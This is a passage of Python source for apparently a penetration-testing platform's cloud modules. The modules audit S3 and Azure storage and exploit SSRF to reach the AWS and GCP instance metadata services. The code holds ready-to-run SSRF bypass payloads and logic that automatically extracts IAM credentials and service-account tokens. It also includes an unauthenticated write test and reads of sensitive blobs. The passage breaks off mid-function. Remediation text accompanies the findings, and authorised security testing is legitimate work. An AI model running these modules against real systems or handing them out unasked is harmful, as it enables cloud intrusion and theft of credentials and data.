"""
Cloud Infrastructure Modules — Sprint 7

C-01  S3 Bucket Audit
C-02  AWS Metadata Exploit (SSRF)
"""

from apps.modules.engine import BaseModule, FieldSchema


# ─── [C-01] S3 Bucket Audit ────────────────────────────────────────────────

class S3BucketAuditModule(BaseModule):
    id = "C-01"
    name = "S3 Bucket Audit"
    category = "cloud"
    description = (
        "Perform a comprehensive audit of an Amazon S3 bucket: enumerate objects, "
        "check ACLs, detect public read/write access, inspect bucket policy, "
        "website hosting, and logging configuration — all without requiring "
        "AWS credentials (unauthenticated checks supported via s3scanner or direct HTTPS)."
    )
    risk_level = "high"
    tags = ["s3", "aws", "cloud", "bucket", "acl", "idor", "misconfiguration"]
    celery_queue = "recon_queue"
    time_limit = 300

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="bucket_name",
            label="S3 Bucket Name",
            field_type="text",
            required=True,
            placeholder="my-company-backup",
            help_text="Just the bucket name, not the full URL.",
        ),
        FieldSchema(
            key="region",
            label="AWS Region",
            field_type="select",
            default="us-east-1",
            options=[
                {"value": "us-east-1",      "label": "US East (N. Virginia)"},
                {"value": "us-east-2",      "label": "US East (Ohio)"},
                {"value": "us-west-1",      "label": "US West (N. California)"},
                {"value": "us-west-2",      "label": "US West (Oregon)"},
                {"value": "eu-west-1",      "label": "EU (Ireland)"},
                {"value": "eu-west-2",      "label": "EU (London)"},
                {"value": "eu-central-1",   "label": "EU (Frankfurt)"},
                {"value": "ap-southeast-1", "label": "Asia Pacific (Singapore)"},
                {"value": "ap-northeast-1", "label": "Asia Pacific (Tokyo)"},
                {"value": "ap-south-1",     "label": "Asia Pacific (Mumbai)"},
            ],
        ),
        FieldSchema(
            key="checks",
            label="Audit Checks",
            field_type="checkbox_group",
            default=["exists", "public_read", "public_write", "objects", "acl"],
            options=[
                {"value": "exists",        "label": "Bucket existence & reachability"},
                {"value": "public_read",   "label": "Public read access (no credentials)"},
                {"value": "public_write",  "label": "Public write access (no credentials)"},
                {"value": "objects",       "label": "Object enumeration (up to 1000 keys)"},
                {"value": "acl",           "label": "ACL / bucket-policy check"},
                {"value": "website",       "label": "Static website hosting detection"},
                {"value": "logging",       "label": "Logging / versioning configuration"},
                {"value": "s3scanner",     "label": "Use s3scanner tool (if installed)"},
            ],
        ),
        FieldSchema(
            key="aws_access_key",
            label="AWS Access Key (optional)",
            field_type="text",
            required=False,
            placeholder="AKIA...",
            help_text="Leave blank for unauthenticated checks only.",
            group="credentials",
        ),
        FieldSchema(
            key="aws_secret_key",
            label="AWS Secret Key (optional)",
            field_type="text",
            required=False,
            placeholder="wJalrXUtnFEMI...",
            group="credentials",
        ),
    ]

    # AWS endpoint templates
    _S3_ENDPOINT = "https://{bucket}.s3.{region}.amazonaws.com"
    _S3_PATH_ENDPOINT = "https://s3.{region}.amazonaws.com/{bucket}"

    def _probe(self, url: str, method: str = "GET", data: bytes = None) -> tuple[int, str, dict]:
        """Return (status_code, body[:4096], headers)."""
        import urllib.request
        import urllib.error

        headers = {"User-Agent": "PenTools/1.0"}
        req = urllib.request.Request(url, headers=headers, method=method, data=data)
        try:
            with urllib.request.urlopen(req, timeout=15) as resp:
                body = resp.read(4096).decode("utf-8", errors="replace")
                return resp.status, body, dict(resp.headers)
        except urllib.error.HTTPError as e:
            body = e.read(2048).decode("utf-8", errors="replace")
            return e.code, body, dict(e.headers) if hasattr(e, "headers") else {}
        except Exception as exc:
            return 0, str(exc), {}

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import re
        from apps.modules.runner import ToolRunner

        bucket = params["bucket_name"].strip()
        region = params.get("region", "us-east-1")
        checks = params.get("checks", ["exists", "public_read"])
        aws_key = params.get("aws_access_key", "").strip()
        aws_secret = params.get("aws_secret_key", "").strip()

        # Normalise bucket name
        bucket = re.sub(r"[^a-z0-9\-.]", "", bucket.lower())
        if not bucket:
            return {"status": "failed", "findings": [], "raw_output": "Invalid bucket name"}

        base_url = self._S3_ENDPOINT.format(bucket=bucket, region=region)
        findings = []
        raw_lines = [f"Target bucket: {bucket} (region: {region})", f"Base URL: {base_url}"]

        # ── s3scanner ──
        if "s3scanner" in checks:
            stream("info", "Running s3scanner...")
            runner = ToolRunner("s3scanner")
            result = runner.run(
                args=["scan", "--bucket", bucket, "--threads", "5"],
                stream=stream, timeout=120,
            )
            raw_lines.append(result.get("stdout", ""))
            # Parse findings from s3scanner output
            for line in result.get("stdout", "").splitlines():
                if "public" in line.lower() or "open" in line.lower() or "vulnerable" in line.lower():
                    findings.append({
                        "title": f"s3scanner: {line.strip()[:120]}",
                        "severity": "high",
                        "url": base_url,
                        "description": line.strip(),
                        "evidence": line,
                        "remediation": (
                            "Remove public ACLs on S3 bucket and objects. Enable S3 Block Public Access. "
                            "Apply a bucket policy that restricts access to authorised AWS principals only."
                        ),
                    })

        # ── Existence check ──
        if "exists" in checks:
            stream("info", f"Probing existence: {base_url}/")
            code, body, hdrs = self._probe(base_url + "/")
            exists = code not in (0, 404, 403)
            # 403 still means bucket exists (just access denied)
            exists = code != 0 and "NoSuchBucket" not in body
            raw_lines.append(f"Existence probe: HTTP {code}")
            if exists:
                stream("info", f"Bucket exists (HTTP {code})")
            else:
                stream("warning", f"Bucket may not exist (HTTP {code})")
                findings.append({
                    "title": f"S3 bucket '{bucket}' not found or unreachable",
                    "severity": "info",
                    "url": base_url,
                    "description": f"HTTP {code} received. Bucket may not exist or is in a different region.",
                    "evidence": body[:500],
                    "remediation": "Verify bucket name and region.",
                })

        # ── Public read ──
        if "public_read" in checks:
            list_url = base_url + "/?max-keys=10"
            stream("info", f"Testing public read: {list_url}")
            code, body, _ = self._probe(list_url)
            if code == 200 and "<ListBucketResult" in body:
                stream("success", "PUBLIC READ confirmed!")
                import re as re2
                keys = re2.findall(r"<Key>(.*?)</Key>", body)
                findings.append({
                    "title": f"S3 bucket '{bucket}' is publicly readable",
                    "severity": "critical",
                    "url": list_url,
                    "description": (
                        f"The bucket is accessible without authentication. "
                        f"Sample keys: {', '.join(keys[:10])}\n"
                        f"This may expose sensitive files to the public internet."
                    ),
                    "evidence": body[:2000],
                    "remediation": (
                        "Enable 'Block All Public Access' on the bucket. "
                        "Remove any ACL grants to AllUsers/AuthenticatedUsers. "
                        "Review IAM bucket policies."
                    ),
                })
            else:
                stream("info", f"Public read: HTTP {code} — not directly readable")

        # ── Public write ──
        if "public_write" in checks:
            test_key = f"pentools-write-test-{job_id[:8]}.txt"
            write_url = f"{base_url}/{test_key}"
            stream("info", f"Testing public write: PUT {write_url}")
            code, body, _ = self._probe(write_url, method="PUT", data=b"pentools-write-test")
            if code in (200, 204):
                stream("success", "PUBLIC WRITE confirmed!")
                findings.append({
                    "title": f"S3 bucket '{bucket}' is publicly writable",
                    "severity": "critical",
                    "url": write_url,
                    "description": (
                        "An unauthenticated PUT succeeded. Attackers can upload malicious "
                        "files (malware, phishing pages, web shells) to this bucket."
                    ),
                    "evidence": f"HTTP {code} on PUT {write_url}",
                    "remediation": (
                        "Immediately remove write permissions from the bucket ACL. "
                        "Enable S3 Block Public Access. Audit bucket policy for wildcard write."
                    ),
                })
                # Clean up test object
                self._probe(write_url, method="DELETE")
            else:
                stream("info", f"Public write: HTTP {code} — write not allowed")

        # ── Object enumeration ──
        if "objects" in checks:
            list_url = base_url + "/?max-keys=1000"
            stream("info", "Enumerating objects...")
            code, body, _ = self._probe(list_url)
            if code == 200 and "<ListBucketResult" in body:
                import re as re3
                keys = re3.findall(r"<Key>(.*?)</Key>", body)
                sizes = re3.findall(r"<Size>(.*?)</Size>", body)
                sensitive_ext = (".sql", ".bak", ".env", ".pem", ".key", ".p12",
                                 ".pfx", ".db", ".csv", ".xlsx", ".json", ".config")
                sensitive_keys = [k for k in keys if any(k.lower().endswith(e) for e in sensitive_ext)]
                raw_lines.append(f"Found {len(keys)} object(s)")
                if sensitive_keys:
                    stream("success", f"Found {len(sensitive_keys)} potentially sensitive file(s)!")
                    findings.append({
                        "title": f"{len(sensitive_keys)} sensitive file(s) in public bucket",
                        "severity": "critical",
                        "url": base_url,
                        "description": (
                            f"Potentially sensitive files found (backups, secrets, databases):\n"
                            + "\n".join(f"  - {k}" for k in sensitive_keys[:50])
                        ),
                        "evidence": "\n".join(sensitive_keys[:100]),
                        "remediation": (
                            "Remove all sensitive files from public-accessible storage. "
                            "Store secrets in AWS Secrets Manager or SSM Parameter Store."
                        ),
                    })
                stream("info", f"Total objects: {len(keys)}")
            else:
                stream("info", f"Object enumeration: HTTP {code}")

        # ── Website hosting ──
        if "website" in checks:
            website_url = f"http://{bucket}.s3-website-{region}.amazonaws.com"
            stream("info", f"Checking website hosting: {website_url}")
            code, body, _ = self._probe(website_url)
            if code == 200:
                findings.append({
                    "title": f"S3 bucket '{bucket}' has static website hosting enabled",
                    "severity": "medium",
                    "url": website_url,
                    "description": (
                        "Static website hosting is active. If content is user-controlled, "
                        "this may be a vector for stored XSS or phishing."
                    ),
                    "evidence": body[:1000],
                    "remediation": "Disable website hosting if not required. Apply CSP headers via CloudFront.",
                })
                stream("info", "Website hosting: ENABLED")

        # ── ACL check ──
        if "acl" in checks:
            acl_url = base_url + "/?acl"
            stream("info", f"Fetching ACL: {acl_url}")
            code, body, _ = self._probe(acl_url)
            raw_lines.append(f"ACL probe: HTTP {code}")
            if code == 200:
                danger_strings = ["AllUsers", "AuthenticatedUsers", "http://acs.amazonaws.com/groups/global"]
                if any(d in body for d in danger_strings):
                    stream("success", "Dangerous ACL grants detected!")
                    findings.append({
                        "title": f"S3 bucket '{bucket}' ACL grants public access",
                        "severity": "critical",
                        "url": acl_url,
                        "description": (
                            "The bucket ACL explicitly grants permissions to AllUsers or "
                            "AuthenticatedUsers (all AWS accounts)."
                        ),
                        "evidence": body[:2000],
                        "remediation": (
                            "Remove AllUsers/AuthenticatedUsers grants from the bucket and object ACLs. "
                            "Use resource-based bucket policies with explicit AWS principal ARNs."
                        ),
                    })
                else:
                    stream("info", "ACL: no public grants detected in response")
            else:
                stream("info", f"ACL: HTTP {code} (credentials may be required)")

        if not findings:
            findings.append({
                "title": f"S3 bucket '{bucket}' — no critical misconfigurations detected",
                "severity": "info",
                "url": base_url,
                "description": "All checked controls appear correctly configured for unauthenticated access.",
                "evidence": "",
                "remediation": "Continue to monitor bucket policies and enable S3 Access Analyzer.",
            })

        stream("success", f"S3 audit complete — {len(findings)} finding(s)")
        return {
            "status": "done",
            "findings": findings,
            "raw_output": "\n".join(raw_lines),
        }


# ─── [C-02] AWS Metadata Exploit (SSRF → IMDSv1) ─────────────────────────────

class AWSMetadataExploitModule(BaseModule):
    id = "C-02"
    name = "AWS Metadata Exploit (SSRF)"
    category = "cloud"
    description = (
        "Test whether a target web application is vulnerable to Server-Side Request "
        "Forgery (SSRF) that allows access to the AWS EC2 instance metadata service "
        "(169.254.169.254). Attempts to retrieve IAM credentials, instance identity, "
        "user data, and security groups via various bypass techniques."
    )
    risk_level = "critical"
    tags = ["ssrf", "aws", "metadata", "imds", "ec2", "credential", "cloud"]
    celery_queue = "recon_queue"
    time_limit = 120

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL (vulnerable endpoint)",
            field_type="url",
            required=True,
            placeholder="https://example.com/fetch?url=",
            help_text="The URL that fetches an external URL. The SSRF payload will be appended.",
        ),
        FieldSchema(
            key="ssrf_param",
            label="SSRF Parameter Name",
            field_type="text",
            required=False,
            default="url",
            placeholder="url",
            help_text="Query parameter or POST field that triggers the SSRF.",
        ),
        FieldSchema(
            key="method",
            label="Request Method",
            field_type="radio",
            default="GET",
            options=[
                {"value": "GET",  "label": "GET"},
                {"value": "POST", "label": "POST (form/json)"},
            ],
        ),
        FieldSchema(
            key="bypass_techniques",
            label="Bypass Techniques",
            field_type="checkbox_group",
            default=["direct", "url_encode", "ip_decimal"],
            options=[
                {"value": "direct",     "label": "Direct IP (169.254.169.254)"},
                {"value": "url_encode", "label": "URL-encoded (%31%36%39...)"},
                {"value": "ip_decimal", "label": "Decimal IP (2852039166)"},
                {"value": "ip_octal",   "label": "Octal IP (0251.0376.0251.0376)"},
                {"value": "ipv6",       "label": "IPv6 mapped (::ffff:169.254.169.254)"},
                {"value": "redirect",   "label": "Open redirect chaining"},
                {"value": "dns_rebind", "label": "DNS rebinding hint (no active test)"},
            ],
        ),
        FieldSchema(
            key="metadata_paths",
            label="Metadata Endpoints to Probe",
            field_type="checkbox_group",
            default=["latest/meta-data/", "latest/meta-data/iam/security-credentials/"],
            options=[
                {"value": "latest/meta-data/",                              "label": "Root metadata"},
                {"value": "latest/meta-data/iam/security-credentials/",     "label": "IAM credentials list"},
                {"value": "latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance", "label": "EC2 instance credentials"},
                {"value": "latest/meta-data/hostname",                      "label": "Instance hostname"},
                {"value": "latest/meta-data/public-ipv4",                   "label": "Public IPv4"},
                {"value": "latest/meta-data/local-ipv4",                    "label": "Internal IPv4"},
                {"value": "latest/dynamic/instance-identity/document",      "label": "Instance identity"},
                {"value": "latest/user-data",                               "label": "User data (may contain secrets)"},
                {"value": "latest/meta-data/security-groups",               "label": "Security groups"},
            ],
        ),
        FieldSchema(
            key="oast_domain",
            label="OAST / Collaborator Domain (optional)",
            field_type="text",
            required=False,
            placeholder="xyz.burpcollaborator.net",
            help_text="If provided, an OAST payload will be injected alongside for out-of-band detection.",
            group="advanced",
        ),
        FieldSchema(
            key="follow_iam_role",
            label="Follow IAM role name to retrieve credentials",
            field_type="toggle",
            default=True,
            help_text="If IAM role name is found, automatically fetch full credentials JSON.",
        ),
    ]

    # Alternative representations of 169.254.169.254
    BYPASS_PAYLOADS = {
        "direct":     "http://169.254.169.254/",
        "url_encode": "http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/",
        "ip_decimal": "http://2852039166/",
        "ip_octal":   "http://0251.0376.0251.0376/",
        "ipv6":       "http://[::ffff:169.254.169.254]/",
        "redirect":   "http://169.254.169.254/",  # would need open-redirect URL in real attack
    }

    def _inject(
        self,
        target_url: str,
        ssrf_param: str,
        method: str,
        payload_url: str,
    ) -> tuple[int, str]:
        """Inject SSRF payload and return (status, body)."""
        import urllib.request
        import urllib.parse
        import urllib.error

        try:
            if method == "GET":
                full_url = f"{target_url.rstrip('?&')}{'&' if '?' in target_url else '?'}{ssrf_param}={urllib.parse.quote(payload_url, safe='')}"
                req = urllib.request.Request(full_url, headers={"User-Agent": "PenTools/1.0"})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    return resp.status, resp.read(8192).decode("utf-8", errors="replace")
            else:
                data = urllib.parse.urlencode({ssrf_param: payload_url}).encode()
                req = urllib.request.Request(
                    target_url,
                    data=data,
                    headers={"User-Agent": "PenTools/1.0", "Content-Type": "application/x-www-form-urlencoded"},
                )
                with urllib.request.urlopen(req, timeout=10) as resp:
                    return resp.status, resp.read(8192).decode("utf-8", errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read(2048).decode("utf-8", errors="replace")
        except Exception as exc:
            return 0, str(exc)

    def _looks_like_metadata(self, body: str) -> bool:
        """Heuristic: does the response look like an IMDS response?"""
        imds_keywords = [
            "ami-id", "instance-id", "hostname", "local-ipv4",
            "security-credentials", "AWSAccessKeyId", "AccessKeyId",
            "SecretAccessKey", "Token", "instance-type",
        ]
        return any(kw in body for kw in imds_keywords)

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import urllib.parse

        target_url = params["target_url"].strip()
        ssrf_param = params.get("ssrf_param", "url").strip() or "url"
        method = params.get("method", "GET")
        bypass_techniques = params.get("bypass_techniques", ["direct"])
        metadata_paths = params.get("metadata_paths", ["latest/meta-data/"])
        oast_domain = params.get("oast_domain", "").strip()
        follow_iam = params.get("follow_iam_role", True)

        findings = []
        raw_lines = [
            f"Target: {target_url}",
            f"Method: {method}",
            f"Bypass techniques: {', '.join(bypass_techniques)}",
        ]

        # ── OAST payload ──
        if oast_domain:
            oast_url = f"http://{oast_domain}/{job_id[:8]}"
            stream("info", f"Injecting OAST payload: {oast_url}")
            self._inject(target_url, ssrf_param, method, oast_url)
            findings.append({
                "title": "OAST payload injected",
                "severity": "info",
                "url": target_url,
                "description": (
                    f"Out-of-band payload sent to {oast_domain}. "
                    "Check your Burp Collaborator / interactsh for hits."
                ),
                "evidence": oast_url,
                "remediation": "Monitor OAST server for incoming DNS/HTTP requests.",
            })

        # ── Try each bypass + metadata path ──
        confirmed_ssrf = False
        ssrf_bypass_used = None

        for bypass in bypass_techniques:
            if bypass == "dns_rebind":
                findings.append({
                    "title": "DNS rebinding — manual test required",
                    "severity": "info",
                    "url": target_url,
                    "description": (
                        "DNS rebinding attacks require a specially crafted DNS server "
                        "(e.g. singularity.me). This is a hint — not an automated test."
                    ),
                    "evidence": "",
                    "remediation": "Implement server-side request validation/allowlisting.",
                })
                continue

            base_payload = self.BYPASS_PAYLOADS.get(bypass, self.BYPASS_PAYLOADS["direct"])

            for path in metadata_paths:
                payload_url = base_payload.rstrip("/") + "/" + path
                stream("info", f"[{bypass}] Testing: {payload_url}")
                code, body = self._inject(target_url, ssrf_param, method, payload_url)
                raw_lines.append(f"[{bypass}] {payload_url} → HTTP {code} / {len(body)} bytes")

                if code == 200 and self._looks_like_metadata(body):
                    confirmed_ssrf = True
                    ssrf_bypass_used = bypass
                    stream("success", f"SSRF confirmed via [{bypass}]! Metadata retrieved.")
                    sev = "critical"
                    findings.append({
                        "title": f"SSRF confirmed — AWS metadata via [{bypass}]: {path}",
                        "severity": sev,
                        "url": target_url,
                        "description": (
                            f"The server fetched the AWS instance metadata endpoint "
                            f"({path}) and returned its content.\n"
                            f"Bypass technique: {bypass}\n"
                            f"This gives attackers access to AWS IAM credentials and instance info."
                        ),
                        "evidence": body[:3000],
                        "remediation": (
                            "1. Enable IMDSv2 (require token-based requests) on all EC2 instances.\n"
                            "2. Block outbound requests to 169.254.169.254 via network ACLs / security groups.\n"
                            "3. Implement server-side URL validation with an allowlist.\n"
                            "4. Use a web application firewall rule to block IMDS IP patterns.\n"
                            "5. Rotate exposed IAM credentials immediately."
                        ),
                        "cvss_score": 9.8,
                        "cwe_id": "CWE-918",
                    })

                    # ── Follow IAM role ──
                    if follow_iam and path == "latest/meta-data/iam/security-credentials/":
                        role_name = body.strip().splitlines()[0] if body.strip() else None
                        if role_name:
                            stream("info", f"Found IAM role: {role_name} — fetching credentials...")
                            cred_path = f"latest/meta-data/iam/security-credentials/{role_name}"
                            cred_url = base_payload.rstrip("/") + "/" + cred_path
                            c2, cred_body = self._inject(target_url, ssrf_param, method, cred_url)
                            if c2 == 200 and "AccessKeyId" in cred_body:
                                import re
                                access_key = re.search(r'"AccessKeyId"\s*:\s*"([^"]+)"', cred_body)
                                findings.append({
                                    "title": f"AWS IAM credentials EXPOSED for role '{role_name}'",
                                    "severity": "critical",
                                    "url": target_url,
                                    "description": (
                                        f"Full IAM credentials retrieved for role '{role_name}'.\n"
                                        f"AccessKeyId: {access_key.group(1) if access_key else 'see evidence'}\n"
                                        "Token and SecretAccessKey also present. Rotate immediately."
                                    ),
                                    "evidence": cred_body[:2000],
                                    "remediation": (
                                        "Immediately revoke and rotate the exposed IAM credentials. "
                                        "Audit CloudTrail for unauthorized API calls. "
                                        "Enable IMDSv2 to prevent future credential theft via SSRF."
                                    ),
                                    "cvss_score": 10.0,
                                    "cwe_id": "CWE-918",
                                })
                                stream("success", "IAM credentials successfully extracted!")

                elif code == 0:
                    stream("warning", f"[{bypass}] Connection error — server may not be reachable")
                else:
                    stream("info", f"[{bypass}] HTTP {code} — payload likely blocked")

            if confirmed_ssrf:
                break  # No need to try more bypasses once confirmed

        if not confirmed_ssrf:
            findings.append({
                "title": "SSRF to AWS metadata endpoint — not confirmed",
                "severity": "info",
                "url": target_url,
                "description": (
                    "None of the tested bypass techniques returned AWS metadata. "
                    "The application may have server-side URL validation, or it may not make "
                    "outbound requests at all."
                ),
                "evidence": "\n".join(raw_lines[-20:]),
                "remediation": (
                    "Continue to enforce server-side URL validation, "
                    "allowlist outbound destinations, and enable IMDSv2 on EC2."
                ),
            })
            stream("info", "SSRF to IMDS: not confirmed with tested techniques")

        stream("success", f"AWS metadata exploit test complete — {len(findings)} finding(s)")
        return {
            "status": "done",
            "findings": findings,
            "raw_output": "\n".join(raw_lines),
            "metadata": {"ssrf_confirmed": confirmed_ssrf, "bypass_used": ssrf_bypass_used},
        }


# ─── [C-03] Azure Blob Storage Audit ─────────────────────────────────────────

class AzureBlobAuditModule(BaseModule):
    id = "C-03"
    name = "Azure Blob Storage Audit"
    category = "cloud"
    description = (
        "Check Azure Blob Storage containers for public access, anonymous read, "
        "misconfigured CORS, and SAS token leaks. Enumerate blobs in accessible "
        "containers and detect sensitive file patterns."
    )
    risk_level = "high"
    tags = ["azure", "blob", "storage", "cloud", "misconfiguration", "public"]
    celery_queue = "web_audit_queue"
    time_limit = 120

    PARAMETER_SCHEMA = [
        FieldSchema(key="storage_account", label="Storage Account Name", field_type="text", required=True,
                    placeholder="mycompanystorage"),
        FieldSchema(
            key="containers",
            label="Container Names (one per line)",
            field_type="textarea",
            default=(
                "$web\nimages\nbackup\ndata\npublic\nassets\nuploads\ndocs\n"
                "videos\nlogs\narchive\nreports\nstatic\nfiles\nprivate"
            ),
        ),
        FieldSchema(key="sas_token",     label="SAS Token (optional, to test auth access)", field_type="text", required=False),
        FieldSchema(key="timeout",       label="Request timeout (s)", field_type="number", default=10),
    ]

    SENSITIVE_PATTERNS = [
        ".env", ".sql", ".db", "backup", "credentials", "password",
        "secret", "private_key", ".pem", ".pfx", ".crt", "config",
        "database.yml", "settings.py", ".htpasswd",
    ]

    def _get(self, url: str, timeout: int) -> tuple:
        import urllib.request, urllib.error
        req = urllib.request.Request(url, headers={"User-Agent": "PenTools/1.0"})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.status, dict(r.headers), r.read(65536).decode("utf-8", errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, dict(e.headers), e.read(2048).decode("utf-8", errors="replace")
        except Exception as ex:
            return 0, {}, str(ex)

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import xml.etree.ElementTree as ET

        account = params["storage_account"].strip()
        raw_containers = params.get("containers", "")
        containers = [c.strip() for c in raw_containers.splitlines() if c.strip()]
        sas_token = params.get("sas_token", "").strip()
        timeout = int(params.get("timeout", 10))

        findings = []
        raw_lines = [f"Storage account: {account}", f"Containers to test: {len(containers)}"]
        base_url = f"https://{account}.blob.core.windows.net"

        # Check if storage account exists
        stream("info", f"Checking storage account: {base_url}")
        code, hdrs, body = self._get(base_url, timeout)
        raw_lines.append(f"Account probe: HTTP {code}")
        if code == 0:
            return {"status": "failed", "findings": [{
                "title": "Azure storage account not reachable",
                "severity": "info", "url": base_url,
                "description": f"Could not reach {base_url}: {body[:200]}",
                "evidence": body[:200],
                "remediation": "Verify the storage account name is correct.",
            }]}

        for container in containers:
            list_url = f"{base_url}/{container}?restype=container&comp=list"
            if sas_token:
                list_url += f"&{sas_token.lstrip('?')}"

            stream("info", f"  Probing container: {container}")
            code, hdrs, body = self._get(list_url, timeout)
            raw_lines.append(f"  [{container}] HTTP {code}")

            if code == 200:
                stream("success", f"Container '{container}' is publicly accessible!")

                # Parse blob list
                blobs = []
                try:
                    root = ET.fromstring(body)
                    ns = {"az": "http://schemas.microsoft.com/windowsazure"}
                    for blob in root.findall(".//Blob") or root.findall(".//az:Blob", ns):
                        name_el = blob.find("Name") or blob.find("az:Name", ns)
                        if name_el is not None and name_el.text:
                            blobs.append(name_el.text)
                except ET.ParseError:
                    pass

                sensitive = [b for b in blobs if any(p in b.lower() for p in self.SENSITIVE_PATTERNS)]

                severity = "critical" if sensitive else "high"
                findings.append({
                    "title": f"Azure blob container '{container}' publicly accessible",
                    "severity": severity,
                    "url": f"{base_url}/{container}",
                    "description": (
                        f"Container '{container}' allows anonymous list/read. "
                        f"{len(blobs)} blob(s) found. "
                        + (f"Sensitive blobs: {sensitive[:5]}" if sensitive else "No sensitive filenames detected.")
                    ),
                    "evidence": (
                        f"URL: {list_url}\n"
                        f"Total blobs: {len(blobs)}\n"
                        f"Blobs: {', '.join(blobs[:20])}\n"
                        + (f"Sensitive: {sensitive}" if sensitive else "")
                    ),
                    "remediation": (
                        "Set container access level to 'Private' in Azure portal. "
                        "Use SAS tokens with limited permissions and expiry for sharing. "
                        "Enable Microsoft Defender for Storage."
                    ),
                    "cvss_score": 9.1 if sensitive else 7.5,
                    "cwe_id": "CWE-552",
                })

                # Try to read individual sensitive blobs
                for sb in sensitive[:3]:
                    blob_url = f"{base_url}/{container}/{sb}"
                    bc, _, bb = self._get(blob_url, timeout)
                    if bc == 200:
                        stream("success", f"Sensitive blob readable: {sb}")
                        findings.append({
                            "title": f"Sensitive blob readable: {container}/{sb}",
                            "severity": "critical",
                            "url": blob_url,
                            "description": f"Blob '{sb}' in container '{container}' is publicly readable.",
                            "evidence": bb[:500],
                            "remediation": "Make container private immediately. Rotate any disclosed credentials.",
                            "cvss_score": 9.8, "cwe_id": "CWE-552",
                        })

            elif code == 403:
                stream("info", f"  [{container}] 403 Forbidden — container requires auth")
            elif code == 404:
                stream("info", f"  [{container}] 404 — container not found")

        # Check CORS
        cors_url = f"{base_url}/?restype=service&comp=properties"
        code_c, hdrs_c, body_c = self._get(cors_url, timeout)
        if code_c == 200 and "<Cors>" in body_c:
            if "<AllowedOrigins>*</AllowedOrigins>" in body_c:
                findings.append({
                    "title": "Azure Blob Storage: wildcard CORS configured",
                    "severity": "medium",
                    "url": cors_url,
                    "description": "CORS is configured with AllowedOrigins=* allowing any web origin to read storage data.",
                    "evidence": body_c[:500],
                    "remediation": "Restrict CORS AllowedOrigins to specific trusted domains.",
                    "cwe_id": "CWE-942",
                })

        if not findings:
            findings.append({
                "title": "Azure Blob audit — no public containers found",
                "severity": "info", "url": base_url,
                "description": f"Tested {len(containers)} container(s). None were publicly accessible.",
                "evidence": "\n".join(raw_lines[-10:]),
                "remediation": "Maintain container access levels as Private. Use SAS tokens for authorised sharing.",
            })

        stream("success", f"Azure blob audit complete — {len(findings)} finding(s)")
        return {"status": "done", "findings": findings, "raw_output": "\n".join(raw_lines)}


# ─── [C-04] GCP Metadata Exploit ─────────────────────────────────────────────

class GCPMetadataExploitModule(BaseModule):
    id = "C-04"
    name = "GCP Metadata Service Exploit"
    category = "cloud"
    description = (
        "Probe the GCP Instance Metadata Service (metadata.google.internal) directly "
        "and via SSRF to extract service account tokens, project info, SSH keys, "
        "and other sensitive instance attributes."
    )
    risk_level = "critical"
    tags = ["gcp", "google", "metadata", "ssrf", "cloud", "token"]
    celery_queue = "web_audit_queue"
    time_limit = 90

    PARAMETER_SCHEMA = [
        FieldSchema(key="target_url",   label="Target URL (for SSRF testing)",   field_type="url",  required=False,
                    placeholder="https://example.com/fetch?url="),
        FieldSchema(key="ssrf_param",   label="SSRF Parameter name",   field_type="text",  required=False, default="url"),
        FieldSchema(
            key="mode",
            label="Test Mode",
            field_type="radio",
            default="ssrf",
            options=[
                {"value": "ssrf",   "label": "Via SSRF on target application"},
                {"value": "direct", "label": "Direct (from inside GCP instance)"},
            ],
        ),
        FieldSchema(
            key="endpoints",
            label="Metadata Endpoints to Probe",
            field_type="checkbox_group",
            default=["root", "sa_token", "project", "instance"],
            options=[
                {"value": "root",       "label": "/ (root listing)"},
                {"value": "sa_token",   "label": "service-accounts/default/token"},
                {"value": "scopes",     "label": "service-accounts/default/scopes"},
                {"value": "email",      "label": "service-accounts/default/email"},
                {"value": "project",    "label": "project/project-id"},
                {"value": "instance",   "label": "instance/id"},
                {"value": "ssh_keys",   "label": "project/attributes/ssh-keys"},
                {"value": "startup",    "label": "instance/attributes/startup-script"},
            ],
        ),
        FieldSchema(key="auth_header", label="Authorization",  field_type="text", required=False, group="credentials"),
    ]

    METADATA_BASE = "http://metadata.google.internal/computeMetadata/v1"
    METADATA_PATHS = {
        "root":     "/",
        "sa_token": "/instance/service-accounts/default/token",
        "scopes":   "/instance/service-accounts/default/scopes",
        "email":    "/instance/service-accounts/default/email",
        "project":  "/project/project-id",
        "instance": "/instance/id",
        "ssh_keys": "/project/attributes/ssh-keys",
        "startup":  "/instance/attributes/startup-script",
    }
    ALT_BASE = "http://169.254.169.254/computeMetadata/v1"

    def _probe_direct(self, path: str, timeout: int = 8) -> tuple:
        import urllib.request, urllib.error
        for base in [self.METADATA_BASE, self.ALT_BASE]:
            url = base + path
            req = urllib.request.Request(url, headers={
                "Metadata-Flavor": "Google",
                "User-Agent": "PenTools/1.0",
            })
            try:
                with urllib.request.urlopen(req, timeout=timeout) as r:
                    return r.status, r.read(8192).decode("utf-8", errors="replace"), url
            except urllib.error.HTTPError as e:
                return e.code, e.read(2048).decode("utf-8", errors="replace"), url
            except Exception:
                continue
        return 0, "unreachable", self.METADATA_BASE + path

    def _probe_via_ssrf(self, ssrf_url: str, ssrf_param: str, meta_path: str,
                        auth: str, timeout: int = 12) -> tuple:
        import urllib.request, urllib.error, urllib.parse

        for base in [self.METADATA_BASE, self.ALT_BASE]:
            meta_url = urllib.parse.quote(base + meta_path, safe="")
            parsed = urllib.parse.urlparse(ssrf_url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            qs[ssrf_param] = [base + meta_path]
            new_qs = "&".join(f"{k}={v[0]}" for k, v in qs.items())
            probe_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))

            headers = {"User-Agent": "PenTools/1.0", "Metadata-Flavor": "Google"}
            if auth:
                headers["Authorization"] = auth
            req = urllib.request.Request(probe_url, headers=headers)
            try:
                with urllib.request.urlopen(req, timeout=timeout) as r:
                    body = r.read(8192).decode("utf-8", errors="replace")
                    return r.status, body, probe_url
            except urllib.error.HTTPError as e:
